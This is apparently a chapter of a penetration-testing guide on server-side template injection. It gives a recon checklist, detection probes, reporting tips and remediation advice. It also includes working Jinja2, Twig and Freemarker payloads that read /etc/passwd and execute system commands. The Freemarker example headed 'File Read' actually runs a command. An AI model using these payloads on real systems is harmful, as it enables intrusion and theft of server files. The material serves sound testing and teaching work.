# Chapter 16 – Template Injection (SSTI)

## Mental Model
Server-side template engines generate dynamic HTML using variables:
- Jinja2 (Python Flask)
- Twig (PHP)
- Mako (Python)
- Freemarker (Java)
- Velocity (Java)
- Handlebars server-side

If user-controlled input is injected directly into the template, attackers can execute:
- Template expressions  
- Arbitrary file read  
- Remote code execution (RCE)

---

## Recon Checklist
Look for:
- `{{something}}` appearing in output
- `${7*7}`, `#{7*7}`, `<%= 7*7 %>` appearing uninterpreted or evaluated
- Error messages referencing:
  - “template”
  - “render”
  - “filter”
- Suspicious parameters like:
  - `name=`
  - `title=`
  - `message=`

Test with harmless probes:
- `{{7*7}}`
- `${7*7}`
- `{{7*'7'}}`
- `<%= 7*7 %>`

If output returns **49**, it's vulnerable.

---

## Jinja2 (Python Flask) Payloads

### Basic Execution
```jinja2
{{7*7}}
Runtime Introspection
{{ config.items() }}

Read /etc/passwd
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

RCE (depending on environment)
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

Twig (PHP)
Basic
{{7*7}}

PHP Function Call
{{system('id')}}

Freemarker (Java)
Expression Test
${7*7}

File Read
<#assign x="freemarker.template.utility.Execute"?new()>
${x("id")}

High-Value Targets

PDF/CSV export features

Email templates

Admin panels

Custom “Preview” or “Message Builder” pages

Notification templates

Automation Ideas

Parameter fuzzer with:

{{7*7}}, ${7*7}, <%=7*7%>

Detect changes in:

Response length

HTTP code

Page content

Build a signature table for each template engine

Reporting Tips

Include:

Vulnerable parameter & request

Proof: expression evaluated (e.g., returns 49)

Impact:

Full RCE possible in many frameworks

Access to private files

Remediation:

Strict input sanitization

Move logic away from templates

Disable expression evaluation when possible
